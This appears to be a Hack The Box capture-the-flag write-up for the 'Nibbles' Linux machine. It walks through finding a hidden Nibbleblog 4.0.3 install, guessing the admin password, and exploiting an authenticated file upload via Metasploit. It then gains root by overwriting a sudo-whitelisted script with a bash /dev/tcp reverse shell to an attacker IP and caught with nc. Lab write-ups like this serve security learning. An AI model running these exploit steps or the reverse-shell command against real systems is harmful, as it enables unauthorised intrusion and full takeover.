---
title: "Nibbles - Writeup"
linkTitle: "Nibbles"
weight: 3
featured: true
platform: "HTB"
name: "Nibbles"
os: "Linux"
difficulty: "Easy"
points: 20
release: "13 Jan 2018"
ip: "10.129.30.80"
# Drop a real avatar at static/img/htb/nibbles.png and uncomment:
# avatar: "/img/htb/nibbles.png"
tags: ["linux", "nibbleblog", "arbitrary-file-upload", "sudo-writable-script", "root-shell"]
description: "Easy Linux box. A hidden HTML comment points to a vulnerable Nibbleblog install, an arbitrary file upload gives a shell, and a world-writable sudo script finishes the job."
---

{{< htb name="Nibbles" os="Linux" difficulty="Easy" points="20" release="13 Jan 2018" ip="10.129.30.80" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.30.80
```

```
Open 10.129.30.80:22
Open 10.129.30.80:80
```

Just SSH and a web server, the site itself is where this box lives.

## Enumeration

The homepage is a single line of text.

![Homepage showing only "Hello world!"](/img/htb/nibbles/01-hello-world.png)

Nothing in the rendered page, but the source tells a different story.

![Page source revealing a hidden comment pointing to /nibbleblog/](/img/htb/nibbles/02-page-source-hint.png)

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

That comment is the entire clue. Fuzz the directory it points at.

```
(root㉿kali)# ffuf -u http://10.129.30.80/nibbleblog/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c
```

```
content     [Status: 301]
themes      [Status: 301]
admin       [Status: 301]
plugins     [Status: 301]
README      [Status: 200]
languages   [Status: 301]
```

The README leaks the exact product and version.

![README file showing Nibbleblog v4.0.3 "Coffee"](/img/htb/nibbles/03-readme-version.png)

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
```

`update.php` confirms the same version on the live install.

![update.php footer confirming Nibbleblog 4.0.3](/img/htb/nibbles/04-update-page-version.png)

The content directory is browsable too, `users.xml` confirms the only account is `admin` and shows two blacklisted IPs from earlier failed login attempts.

![users.xml showing the admin account and blacklisted attacker IPs](/img/htb/nibbles/05-users-xml.png)

## Initial Foothold

Nibbleblog 4.0.3 has a known arbitrary file upload vulnerability, available as a Metasploit module.

```
(root㉿kali)# searchsploit Nibbleblog 4.0.3
```

```
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb
```

The vulnerability requires an authenticated session, and the blog's own name doubles as a working guess for the admin password.

```
msfconsole
search Nibbleblog 4.0.3
use 0
set RHOSTS 10.129.30.80
set LHOST 10.10.15.249
set LPORT 443
set username adminnibbles
set password nibbles
```

Once the module runs, the upload primitive drops a payload and a meterpreter session lands, drop into a raw shell from there.

```
meterpreter > shell
```

```
Process 2178 created.
Channel 3 created.
```

## Privilege Escalation

```
sudo -l
```

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```
cat /home/nibbler/personal/stuff/monitor.sh
```

```
cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
```

The script doesn't exist yet, but the sudo rule already trusts that exact path. Check the home directory for anything that creates it.

```
cd /home/nibbler
ls
```

```
personal.zip
user.txt
```

```
unzip personal.zip
```

```
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

Unzipping recreates the exact path sudo already whitelists, and the extracted script is writable. Overwrite it with a reverse shell.

```
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.249/4433 0>&1'" > /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

```
(root㉿kali)# rlwrap nc -lvnp 4433
```

```
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.80] 41644
root@Nibbles:/home/nibbler#
```

```
cd /root
cat root.txt
```

```
12c00eccafce19d382bfeaa409afaabd
```

## Lessons learned

- Always check the page source, not just what renders. A single HTML comment was the only pointer to the entire vulnerable application on this box.
- A sudo rule pointing at a file that doesn't exist yet isn't a dead end, it's a target. Whatever recreates that exact path, even something as ordinary as unzipping an archive, inherits the trust already granted to it.
- CMS-specific credentials are worth guessing from context before brute-forcing. The product's own name being a valid password is common enough to try first.
